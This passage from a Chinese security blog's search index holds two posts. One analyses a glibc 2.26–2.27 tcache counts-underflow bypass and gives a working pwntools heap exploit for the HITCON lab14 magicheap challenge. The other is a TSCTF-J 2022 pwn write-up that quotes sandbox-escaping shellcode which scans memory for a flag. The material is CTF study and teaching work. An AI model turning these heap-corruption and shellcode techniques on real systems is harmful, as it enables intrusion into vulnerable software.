title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>      <span class="token comment">/* Fill cache first, return to user only if cache fills. We may return one of these chunks later.  */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb  <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>  return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">}</span>      <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb  <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是我们便在源码中寻找各变量的定义<br>tcache_perthread_struct结构体中定义了char 类型的counts数组</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>glibc中并没有给出mp_.tcache_count的类型定义，不过我们可通过这一赋值操作推出mp_.tcache_count是size_t类型，而size_t在大部分机器上是无符号整型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">do_set_tcache_count</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tunable_tcache_count<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">;</span>  mp_<span class="token punctuation">.</span>tcache_count <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是counts是char类型，mp_.tcache_count是size_t类型，在比较时会发生整型提升，故若能使counts为一个负数，便可绕过这一判断<br>那有没有办法使counts变为一个负数呢？答案是有，可以通过整数溢出做到<br>在tcache_get中存在对counts域的–操作，于是只要从Tcache中分配出的chunk数量大于释放进Tcache的数量，便可使counts变为一个负数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于上述操作，可以通过Tcache Poisoning技术做到(即伪造一个Tcache中的chunk,且由于Tcache分配时无对size域的检查,使这一操作能够轻松完成)<br>到此我们便完成了Tcache机制的绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这一绕过方法得益于glibc2.26-2.27中tcache_get函数的错误assert操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//第二个断言的内容是错误的，本意应该是检查counts的符号</span>  <span class="token comment">//即assert(tcache-&gt;counts[tc_idx]&gt;0);</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-&gt;</span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-&gt;</span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-&gt;</span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一漏洞已在glibc2.28后的版本中修复</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>看起来感觉挺鸡肋，但是大多数题目会限制分配堆块的大小和数量，此时前两个绕过方法便已失效,这一方法便有了用武之地</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>还是以Unsortedbin Attack的经典题hitcontraining_lab14为例</p><h4 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ol><li>题目中edit_heap函数没有对size的限制存在堆溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap2.png"></li><li>若bss段变量magic&gt;4869即可执行后门函数<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap1.png"><br>所以就是Unsortedbin Attack修改magic的值</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magicheap'</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>tcache_poisoning <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>tcache_poisoning<span class="token punctuation">)</span><span class="token punctuation">,</span>tcache_poisoning<span class="token punctuation">)</span>  create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#此时Tcache的counts域已为-1，完成绕过</span>  create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment"># 防止与top chunk合并</span><span class="token comment">#Unsortedbin Attack</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> magic<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>文中提出的这一绕过方法利用价值不大，但这也是我第一次通过源码来分析问题，还是有一点纪念意义的<br>我倒是希望在以后的做题中能有这一绕过方法的用武之地吧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF-J</title>
      <link href="/2022/11/09/2022tsctf-j-writeup-2022.10.17/"/>
      <url>/2022/11/09/2022tsctf-j-writeup-2022.10.17/</url>
      
        <content type="html"><![CDATA[<p>[[PWN ？！]]<br>[[PWN生涯]]</p><ul><li><h3 id="–writeby-HanQi"><a href="#–writeby-HanQi" class="headerlink" title="–writeby__HanQi"></a>–writeby__HanQi</h3></li><li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1>算是正式做的第一次比赛吧，啥也不会坐牢四天（悲<br>题目难度感觉还好(不会做都是我太菜)（比moe或hn难一点？至少pwn题是这样<br>也是第一次写wp，认真写一下留个纪念</li><li><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><h2 id="checkin-stackoverflow"><a href="#checkin-stackoverflow" class="headerlink" title="checkin(stackoverflow)"></a>checkin(stackoverflow)</h2><ul><li><h3 id="checksec-IDA"><a href="#checksec-IDA" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>栈溢出覆盖ch_0的值就好了</li><li><img src="https://i.niupic.com/images/2022/10/17/a9tq.png"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tr.png"></li></ul></li><li><h2 id="ヰ世界転生-int-overflow-ret2text"><a href="#ヰ世界転生-int-overflow-ret2text" class="headerlink" title="ヰ世界転生(int overflow+ret2text)"></a>ヰ世界転生(int overflow+ret2text)</h2><ul><li><h3 id="checksec-IDA-1"><a href="#checksec-IDA-1" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>循环lose累积分数<br><img src="https://i.niupic.com/images/2022/10/17/a9tG.png">{:height 992, :width 776}<br>末尾有一个point_checker的函数，进去看一眼，给points设了上限，盲猜是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9ts.png"><br>然后是用分数换技能，前面花里胡哨没啥用（命名竟然比技能贵…<br><img src="https://i.niupic.com/images/2022/10/17/a9tt.png"><br>从有输入的地方开始看，第一次先输入长度nbytes，再第二次输入内容存到buf，对nbytes有长度限制，估计还是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9tH.png"><br>大概逻辑理清后来找一找后门函数或’/bin/sh’（其实一来就该找？<br><img src="https://i.niupic.com/images/2022/10/17/a9ty.png"><br>再关注一下刚刚发现的两个整形溢出点，看一下有无类型转换之类的，还真有<br><img src="https://i.niupic.com/images/2022/10/17/a9tz.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tM.png"></li><li><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tv.png"></li></ul></li><li><h2 id="ret2shellcode-orw"><a href="#ret2shellcode-orw" class="headerlink" title="ret2shellcode(orw)"></a>ret2shellcode(orw)</h2><ul><li><h3 id="checksec-IDA-gdb"><a href="#checksec-IDA-gdb" class="headerlink" title="checksec+IDA+gdb"></a>checksec+IDA+gdb</h3>大概流程就是mmap分配一个可写可执行的空间，让你写入code并执行<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>尝试shellcraft.sh()后未成功，gdb调试发现系统调用时进程崩溃,显示“bad syscall” 搜索后发现有沙盒<br>第一次见 并在init函数里发现函数prctl 禁止了execve调用，仅允许open、read、write读取flag<br><img src="https://i.niupic.com/images/2022/10/17/a9tN.png"></li><li><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>利用pwntools写orw的汇编，发现长度过长，只能手写<br><img src="https://i.niupic.com/images/2022/10/17/a9tx.png"><br>换成如下(其实还是网上找的code,原code还是长了,在出题人提示下删掉了重复的参数布置过程)<br><img src="https://i.niupic.com/images/2022/10/17/a9tO.png"></li></ul></li><li><h2 id="ASCII-ART-partial-overwrite"><a href="#ASCII-ART-partial-overwrite" class="headerlink" title="ASCII_ART(partial overwrite)"></a>ASCII_ART(partial overwrite)</h2><ul><li><h3 id="checksec-IDA-2"><a href="#checksec-IDA-2" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>简洁的main函数（并不影响我看不懂<br><img src="https://i.niupic.com/images/2022/10/17/a9tw.png"><br>找找后门，有好东西<br><img src="https://i.niupic.com/images/2022/10/17/a9tQ.png"><br>gdb发现输入是可以覆盖返回地址的，再加上开了pie，那就是partial overwrite<br><img src="https://i.niupic.com/images/2022/10/17/a9tE.png"></li><li><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tA.png"></li></ul></li><li><h2 id="Another-Checkin-Pwn-blind-fmtstr"><a href="#Another-Checkin-Pwn-blind-fmtstr" class="headerlink" title="Another_Checkin_Pwn(blind fmtstr)"></a>Another_Checkin_Pwn(blind fmtstr)</h2>没做出来，还是写一下（也不知道binary为啥没dump下来<br>没文件IDA不了了，输入字符发现回显，那就是格式化字符串盲打了，换了好多种写法，最终还是没<br>dump下来，(记住有循环…不用每次都remote)<br>还有两个没删的脚本放一放，以后再回来看为啥不行<br><img src="https://i.niupic.com/images/2022/10/17/a9tR.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tX.png"></li><li><h2 id="Easy-shellcode"><a href="#Easy-shellcode" class="headerlink" title="Easy shellcode"></a>Easy shellcode</h2>没有写出来，不过确实学到很多<ul><li><h3 id="checksec-IDA-seccomp-tools"><a href="#checksec-IDA-seccomp-tools" class="headerlink" title="checksec+IDA+seccomp-tools"></a>checksec+IDA+seccomp-tools</h3>mmap开了一块空间存入flag.txt，再mmap了一段可执行的空间写code，空间内开头的一段code是清空寄存器(还傻乎乎的asm反汇编，gdb就能看啊),后面的空间就交给我们操作。<br><img src="https://i.niupic.com/images/2022/10/17/a9tC.png"><br>重要的一点就是寄存器并没有完全清空，r15里还存有初始地址，可以通过找到text段的地址<br><img src="https://i.niupic.com/images/2022/10/17/a9tD.png"><br>找到了prctl，看一下沙盒规则,发现见过的调用全部ban掉 （其实经测试read，open，write是可以用的，但可能是参数布置的问题读到了但是没有打印出来，错失白给的机会呜呜，反馈后更新了附件）<br><img src="https://i.niupic.com/images/2022/10/17/a9tB.png"><br><img src="https://i.niupic.com/images/2022/10/17/a9tS.png"></li><li><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3>最开始的想法是既然能控制程序回到text段，那就可以重新控制参数并调用prtcl函数更改沙盒规则，多次尝试均失败（应该是不行的）<br><img src="https://i.niupic.com/images/2022/10/17/a9tF.png"><br>还有关键问题找不到buf段的位置，磨了一整天也没搞出来</li></ul></li></ul><h3 id="附上官方wp"><a href="#附上官方wp" class="headerlink" title="附上官方wp"></a>附上官方wp</h3>  <pre class="line-numbers language-python" data-language="python"><code class="language-python">sc <span class="token operator">=</span> <span class="token triple-quoted-string string">"""lea rsp, [rip+0x500]lea r13, [rip]mov r14, 0xfffffff00000 and r13, r14 # 使r13页对齐loop:add r13, 0x1000pop r14 #回收上一次push的r13地址pop r14push 0x1 #因为writev的参数是一个结构体iovec，这里的1表示iov_lenpush r13mov rdi, 2mov rsi, rspmov rdx, 1mov rcx, 0mov rax, 20syscallcmp rax, 0  #判断writev的返回值是否为负数，即该页是否可读jl loop # 若不可读再次循环mov rdi, [r13]cmp edi, 0x54435354 #判断字符串是否以TSCT开头jnz looppush 31push r13mov rdi, 2mov rsi, rspmov rdx, 1mov rcx, 0mov rax, 20syscall #打印flagjmp $"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3>  这个地方的文件描述符错误应该是2，系统调用可用writev<br><img src="https://i.niupic.com/images/2022/10/17/a9tu.png"><ul><li><h2 id="堆相关"><a href="#堆相关" class="headerlink" title="堆相关"></a>堆相关</h2>其实之前有花时间看过堆的内容，可是太多而且不好理解，看了啥也没记住，下去得好好学一下</li></ul></li></ul></li><li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>光搁pwn坐牢了，其实web学的时间比pwn更长，结果一题没出<br>感觉pwn找资料好难，有没有啥blog分享一下<br>最后引一段从0到1的话，好好去学pwn的基础<br><img src="https://i.niupic.com/images/2022/10/17/a9tT.png"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
